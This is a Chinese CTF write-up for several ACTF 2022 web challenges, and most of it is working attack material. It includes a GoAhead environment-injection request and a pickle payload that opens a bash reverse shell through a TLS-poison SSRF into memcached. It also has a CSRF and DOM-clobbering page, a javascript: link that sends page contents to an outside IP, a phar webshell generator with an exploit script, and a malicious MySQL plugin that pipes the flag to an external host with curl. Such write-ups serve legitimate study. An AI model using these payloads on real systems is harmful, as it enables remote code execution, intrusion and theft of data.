---
title: "aCTF2022 Wp"
slug: "actf2022-wp"
description: "拖了两周才复现完，罪过罪过"
date: 2022-07-07T13:48:05+08:00
categories: ["CTF"]
series: []
tags: ["wp"]
draft: false
toc: true
---

## gogogo

下附件，src全是二进制文件，dockerfile得知是GoAhead，目测出网

http://123.60.84.229:10218/cgi-bin/hello可以看环境变量，显然是打GoAhead那个cve，尝试直接打iscc那个bash注入（换成劫持env）

```http
POST /cgi-bin/hello HTTP/1.1
Host: 123.60.84.229:10218
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylNDKbe0ngCGdEiPM
Content-Length: 184

------WebKitFormBoundarylNDKbe0ngCGdEiPM
Content-Disposition: form-data; name="BASH_FUNC_echo%%"
Content-Type: text/plain

() { cat /flag; }
------WebKitFormBoundarylNDKbe0ngCGdEiPM--

```

`ACTF{s1mple_3nv_1nj3ct1on_and_w1sh_y0u_hav3_a_g00d_tim3_1n_ACTF2022}`

- 最开始我脑子短路了，去劫持echo，还在想为什么是白屏啊（这不废话），然后还试了LD_PRELOAD传.so，令人感叹

## ToLeSion

http://123.60.131.135:10023

参考：[pycurl doc](http://pycurl.io/docs/latest/index.html)  |  [flask插件系列之flask_session会话机制 ](https://www.cnblogs.com/cwp-bg/p/9339865.html)  |  [Memcached stats 命令](https://www.runoob.com/memcached/memcached-stats.html)

一个flask，比较特别的地方在于memcached，所有的python第三方库都是最新

其中memcached在本地起着服务，位于127.0.0.1:11200，不对外开放，参与缓存flask的session

```bash
# start.sh
memcached -d -m 50 -p 11200 -u root

# app.py
app.config['SESSION_MEMCACHED'] = memcache.Client(['127.0.0.1:11200'])
```

一共就一个路由

```python
app = Flask(__name__)
app.debug = True
app.secret_key = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(56))  # 随机key

app.config['SESSION_TYPE'] = 'memcached'
app.config['SESSION_PERMANENT'] = True
app.config['SESSION_USE_SIGNER'] = False
app.config['SESSION_KEY_PREFIX'] = 'actfSession:'
app.config['SESSION_MEMCACHED'] = memcache.Client(['127.0.0.1:11200'])  # memcache本地服务端地址

Session(app)

# 跳转至?url参数指定的网址
@app.route('/')
def index():
    buffer=BytesIO()    # 字节流缓冲区
    if request.args.get('url'):
        url = request.args.get('url')
        c = pycurl.Curl()   # 默认不跟随重定向 处理单一url 同名参数取第一个
        c.setopt(c.URL, url)    # url参数的全部 此时无过滤
        c.setopt(c.FTP_SKIP_PASV_IP, 0) # （不）跳过PASV的IP地址 ftp
        c.setopt(c.WRITEDATA, buffer)   # 为响应提供缓冲区
        blacklist = [c.PROTO_DICT, c.PROTO_FILE, c.PROTO_FTP, c.PROTO_GOPHER, c.PROTO_HTTPS, c.PROTO_IMAP, c.PROTO_IMAPS, c.PROTO_LDAP, c.PROTO_LDAPS, c.PROTO_POP3, c.PROTO_POP3S, c.PROTO_RTMP, c.PROTO_RTSP, c.PROTO_SCP, c.PROTO_SFTP, c.PROTO_SMB, c.PROTO_SMBS, c.PROTO_SMTP, c.PROTO_SMTPS, c.PROTO_TELNET, c.PROTO_TFTP]    # 禁用的协议
        allowProtos = c.PROTO_ALL
        for proto in blacklist:
            allowProtos = allowProtos&~(proto)
        c.setopt(c.PROTOCOLS, allowProtos)  # 还剩FTPS, HTTP, RTMPT, RTMPTE, RTMPTS，貌似可用的只有HTTP？
        c.perform()
        c.close()
        return buffer.getvalue().decode('utf-8')
    else:
        return redirect('?url=http://www.baidu.com',code=301)
```

访问127.0.0.1:5000是可以的，11200会500

本地起个docker看看memcached![image-20220625155247610](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220625155247610.png)

是序列化后的内容，emm，考虑构造ftps协议的内容触发pickle反序列化？

————比赛的时候就想到这里，搜到了几篇文章，但过程过于复杂就放弃了，下面是赛后复现

主要参考陆队这两篇文章->[一篇文章带你读懂 TLS Poison 攻击](https://blog.zeddyu.info/2021/04/20/tls-poison/)  |  [TLS-Poison 攻击方式在 CTF 中的利用实践](https://blog.zeddyu.info/2021/05/19/tls-ctf/)，还有赵总的这篇文章->[基于 A 和 AAAA 记录的一种新 DNS Rebinding 姿势–从西湖论剑2020 Web HelloDiscuzQ 题对 Blackhat 上的议题做升华](https://www.zhaoj.in/read-6681.html) ，前置内容可以参考[TLS 握手优化详解](https://imququ.com/post/optimize-tls-handshake.html)

**先简单了解一下TLS Poison：**

根据我们对TLS连接过程的了解，不论在TLS 1.2或是1.3中都会使用类似cookie的32位sessionID来验证客户端的身份，这个凭据由服务端下发至客户端，服务端不保存，当客户端HTTPS访问站点时服务端会对其进行解密；此时如果我们有一个恶意的服务器，向客户端分发特制的凭据，客户端就会把这个凭据存储起来

在实际进行HTTPS请求之前，客户端需要对域名进行DNS查询，如果DNS缓存过期则会再进行一次DNS查询，如果没有过期，很容易联想到DNS重绑定

第一次请求时返回指向我们恶意服务器的IP，使第一次TLS握手成功 客户端缓存恶意的凭据，在第二次请求需要恢复会话时发起第二次DNS请求，此时返回重绑定的结果127.0.0.1，当客户端恢复会话时客户端会用我们恶意服务器下发的凭据与127.0.0.1尝试TLS握手，也就是说对内网地址进行一次请求

有一张很直观的图可以辅助理解

![img](https://raw.githubusercontent.com/jmdx/TLS-poison/master/diagram.svg)

回到本题，我们可以利用的服务是ftps，当客户端使用ftps://ip:port/访问ftp服务器时，ftp在被动模式下向客户端指定数据传输的ip和端口，我们需要将payload的部分通过ftp请求的方式进行传输，同时要注意满足TLS的解析

首先用[TLS-Poison](https://github.com/jmdx/TLS-Poison%E3%80%82)来实现TLS层的解析，通过下面的命令监听8000端口并将tls解析之后应用层的内容转发给1234端口

```
target/debug/custom-tls -p 8000 --verbose --certs /etc/letsencrypt/live/<your_domain>/fullchain.pem --key /etc/letsencrypt/live/<your_domain>/privkey.pem  forward 1234
```

使用redis设置payload：

```
set payload "\r\nset actfSession:whatever 0 0 <len>\n(S'/bin/bash -c \"/bin/bash -i >& /dev/tcp/<your_domain>/8080 0>&1\"'\nios\nsystem\n.\r\n"
```

经过8000端口的解析，转发到1234端口的内容就是普通的ftp请求了。在1234端口开启一个被动模式返回ip和端口是ssrf目标的ftp服务即可，针对本题就是127.0.0.1的11200端口：

```bash
python3 FTPserverForTLSpoison.py 1234 127.0.0.1 11200
```

控制目标机访问ftps://<your_domain>:8000/，即可触发上述TLS-Poison流程，向memcached写入序列化字符串







## beWhatYouWannaBe

http://124.71.180.254:10022

惯例先看bot行为

```js
const puppeteer = require('puppeteer');
const process = require('process')
const ADMIN_USERNAME = 'admin'
const ADMIN_PASSWORD = process.env.password
const FLAG = require('./config').FLAG
const view = async(url) => {
    const browser = await puppeteer.launch({
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox']
    })
    const page = await browser.newPage()
    await page.goto('http://localhost:8000/login')  // 以admin登入
    await page.type("#username", ADMIN_USERNAME)
    await page.type("#password", ADMIN_PASSWORD)
    await page.click('#btn-login')
        // get flag1
    await page.goto(url, { timeout: 5000 }) // 访问我们的url 无过滤
        // get flag2
    await page.setJavaScriptEnabled(false)  // 禁用页面js
    await page.goto(url, { timeout: 5000 })
    await page.evaluate((url, FLAG) => {
        if (fff.lll.aaa.ggg.value == "this_is_what_i_want") {	// 页面标签？
            fetch(url + '?part2=' + btoa(encodeURIComponent(FLAG.substring(16))))   // 将后一部分flag作为query参数访问url 后半部分flag只有这种方式获取
        } else {
            fetch(url + '?there_is_no_flag')
        }
    }, url, FLAG)
    await browser.close()
}

exports.view = view
```

再看app，/flag路由直接给前半部分

```js
app.get('/flag', (req, res) => {
    if (!req.session.user) {
        res.send(FAKE_FLAG)
        return
    }
    User.findOne({ username: req.session.user }, (err, user) => {
        if (err) {
            res.send({ err: err })
            return
        }
        if (user.isAdmin) {
            // part 1
            res.send(FLAG.substring(0, 16))
        } else {
            res.send(FAKE_FLAG)
        }
    })
})
```

还有个成为~~魔法少女~~admin的路由

```js
app.post('/beAdmin', (req, res) => {
    if (req.session.user != 'admin') {
        res.send("sorry, only admin can be admin")
        return
    }
    const username = req.body.username
    const csrftoken = req.body.csrftoken
    if (ValidateToken(csrftoken)) {
        User.updateMany({ username: username }, { isAdmin: true },
            (err, users) => {
                if (err) {
                    res.send('something error when being admin')
                    return
                }
                if (users.length == 0) {
                    res.send('no one can be admin')
                } else {
                    res.send('wow success wow')
                }
            }
        )
    } else {
        res.send('validate error')
    }
})
```

思路比较清晰，构造payload1.html，其中包含js脚本让admin访问/beAdmin让我们自己的账号成为admin，访问/flag获取前半flag，需要绕过csrftoken

```js
const ValidateToken = (Token) => {
    var sha256 = crypto.createHash('sha256');
    return sha256.update(Math.sin(Math.floor(Date.now() / 1000)).toString()).digest('hex') === Token;
}
```

我们可以大致爆破/预测

而第二部分flag，由于禁用了页面js，我们可以随意发挥的地方就只有css和少得可怜的html标签了，需要满足的关键条件是

```
fff.lll.aaa.ggg.value == "this_is_what_i_want"
```

ggg.value被嵌套在上面几层的引用，可以参照陆队[这篇文章](https://blog.zeddyu.info/2020/03/04/Dom-Clobbering/#more)

```html
<iframe name=fff srcdoc="<iframe srcdoc='<input id=aaa name=ggg href=cid:Clobbered
value=this_is_what_i_want>test</input><a id=aaa>' name=lll>"></iframe>
```

payload参考[Nu1L战队的wp](https://t.zsxq.com/03M3bIa6a)

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>
    <form id="form" action="<http://localhost:8000/beAdmin>" method="post">
        <input name="username" value="awc">
        <input id="csrftoken" name="csrftoken" value="">
    </form>
    <iframe name=fff srcdoc="<iframe srcdoc='<input id=aaa name=ggg href=cid:Clobbered
value=this_is_what_i_want>test</input><a id=aaa>' name=lll>"></iframe>
    <script src="crypto-js.min.js"></script>	<!--同目录下传一份-->
    <script>
        csrftoken.value = CryptoJS.SHA256(Math.sin(Math.floor(Date.now() /
            1000)).toString()).toString(CryptoJS.enc.Hex);
        form.submit();
    </script>
</body>
</html>
```

![image-20220628152555103](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220628152555103.png)

尴尬的是只能获得这后半部分，csrftoken总是爆破不对，这里参考[SU战队的wp](https://mp.weixin.qq.com/s/DCxrEmkYzFdUa2YHOdnD7g)

```js
javascript:s=q=>window.open('http://101.35.114.107:2301/?q='+encodeURIComponent(q));s('start');w=window.open('/flag');setTimeout(()=>{s('timeout');s(w.document.body.innerText)},1000)
```

![image-20220628155441694](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220628155441694.png)

直接转发一手responseText即可，但是尴尬的是打比赛的时候我想到了，但是用的是笨拙的xhr，就没成功…………我太菜了

## *poorui

http://124.71.181.238:8081/

当时没来得及看这道题，但是看wp貌似很简单（非预期？）

burp拦截websocket

```
{"api":"getflag","from":"admin"}
```

预期解还没有看，挖个坑

## myclient

> http://124.71.205.170:10047
>
> 远程的环境的/tmp是固定的，不需要sql注入，/tmp目录每五分钟清理一次

这个index.php很难不让人有既视感，详情参见->[TQLCTF-SQL_TEST出题笔记](https://igml.top/2022/02/20/TQLCTF2022/)

对比两道题目的源码，有以下几个地方不一样（突破点）：

- 根本没有初始化数据库（所以不用注库或表），只有一个初始账号

- Dockerfile中有这样的设置

```dockerfile
RUN echo "\nSetHandler application/x-httpd-php\n" >> /etc/apache2/apache2.conf
RUN echo "\nLoadModule php7_module modules/libphp7.so\n" >> /etc/apache2/apache2.conf
```

在可访问到的web目录下不用.php系列后缀也可以被解析为php了，并且手动启用libphp7的模块用来支持php7

- 没有pop+phar的点，但同样必须RCE

相同的地方是都设了secret_file_priv到/tmp下一个临时目录，和本地的是一样的（所以提升不用注 笑死）

{{% spoiler "失败的尝试" %}}

缺少的框架pop我们可以换成原生类，比如原生类SplFileObject写文件；另外再把MYSQLI_SERVER_PUBLIC_KEY的值改为目标环境下的29

初步payload

```php
<?php
define("EV", "eva"."l");
define("GETCONT", "fil"."e_get_contents");
define("D",(GETCONT)('/var/www/html/index.php')[10]);
define("SHELL","<?php ".EV."(".D."_POST['a']);");
echo SHELL;

class TestObject {
    public function __destruct(){
        $file = new SplFileObject("/var/www/html/res", "w");	// 被反序列化后创建webshell
        $written = $file->fwrite(SHELL);
    }
}

$phar = new Phar('phar.phar');
$phar -> startBuffering();
$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');   // 设置stub，增加gif文件头
$phar -> addFromString('test.txt','test');  // 添加要压缩的文件
$object = new TestObject();
$object -> data = 'wuhu';
$phar -> setMetadata($object);  // 将自定义meta-data存入manifest
$phar -> stopBuffering();

// for test
file_get_contents('phar:///tmp/e10adc3949ba59abbe56e057f20f883e/phar.phar');	// 顺利的话会在/var/www/html/res有个webshell
```

exp.py

```python
import re
import requests, string, random, os, time

url = "http://101.35.114.107:10047"
#url = "http://124.71.205.170:10047"


def req(key, value):
    resp = requests.get(url + "/index.php/", params={'key': key, 'value': value})
    return resp


def exp(secure_file_path):
    filename = "".join(random.sample(string.ascii_letters, 6)) + '.phar'
    file = os.path.join(secure_file_path, filename)

    # write phar file
    hex_data = open("phar.phar", "rb").read().hex()
    command = "select 0x{} into dumpfile '{}'".format(hex_data, file)
    req('3', command)

    # check file exists
    command = "select if((ISNULL(load_file('{}'))),sleep(2),1)".format(file)
    if req('3', command).elapsed.seconds > 1.5:
        print("file write fail!")
        exit()

    # clean the cache
    flush = req('3',"FLUSH PRIVILEGES")
    print(flush.text)
    time.sleep(2)

    # trigger unserialize
    resp = req('29', 'phar://' + file)
    print("unser: " + resp.text)


if __name__ == '__main__':
    secure_file_path = '/tmp/e10adc3949ba59abbe56e057f20f883e/'
    exp(secure_file_path)
```

结果发现可以写phar，但是反序列化失败，原因是RELOAD没有被授权给mysql，所以无法FLUSH PRIVILEGES，就无法清除缓存

```bash
mysql -u root -e "CREATE USER '$MYSQL_USER'@'%' IDENTIFIED BY '$MYSQL_PASS';";
mysql -u root -e "GRANT SELECT on mysql.* to '$MYSQL_USER'@'%';FLUSH PRIVILEGES;";
mysql -u root -e "GRANT FILE on *.* to '$MYSQL_USER'@'%';FLUSH PRIVILEGES;";
```

因为倒霉的权限，改密码来强制清空缓存也是不现实的

```mysql
update user set authentication_string='' where user='test';
# UPDATE command denied to user 'test'@'localhost' for table 'user' in /var/www/html/index.php
ALTER USER 'test'@'localhost' IDENTIFIED BY '123456';
# mysqli_real_connect(): (42000/1227): Access denied; you need (at least one of) the CREATE USER privilege(s) for this operation in /var/www/html/index.php
```

{{% /spoiler %}}

正确的思路：

首先用`MYSQLI_INIT_COMMAND`写一个恶意的.so文件（包含mysql连接信息，同时可以rce并外带flag），然后再写一个Defaults配置将client plugin-dir指向/tmp下面那个目录，之后通过`MYSQLI_READ_DEFAULT_FILE`指定为那个配置信息，触发.so

payload参考自[SU战队wp](https://mp.weixin.qq.com/s/DCxrEmkYzFdUa2YHOdnD7g)

```c
#include <mysql/client_plugin.h>
#include <mysql.h>
#include <stdio.h>

/*
Ubuntu x86_64:
apt install libmysqlclient-dev
gcc -shared -I /usr/include/mysql/ -o evilplugin.so evilplugin.c
NOTE: the plugin_name MUST BE the full name with the directory traversal!!!
*/

static int evil_init(char * a, size_t b , int c , va_list ds)
{
    system("/readflag | curl -XPOST http://101.35.114.107:8426/ -d @-");
    return NULL;
}

static int evilplugin_client(MYSQL_PLUGIN_VIO *vio, MYSQL *mysql)
{
int res;
  res= vio->write_packet(vio, (const unsigned char *) mysql->passwd, strlen(mysql->passwd) + 1);
  return CR_OK;
}

mysql_declare_client_plugin(AUTHENTICATION)
  "auth_simple",  /* plugin name */
  "Author Name",                        /* author */
  "Any-password authentication plugin", /* description */
  {1,0,0},                              /* version = 1.0.0 */
  "GPL",                                /* license type */
  NULL,                                 /* for internal use */
  evil_init,                                 /* no init function */
  NULL,                                 /* no deinit function */
  NULL,                                 /* no option-handling function */
  evilplugin_client                    /* main function */
mysql_end_client_plugin;
```

```bash
gcc t.c -fPIC -shared -o poc.so
```

本地环境拉了，一直编译不成功 即使已经安装了对应的库。。。。。。

（真的不是我懒（（（（（（（（



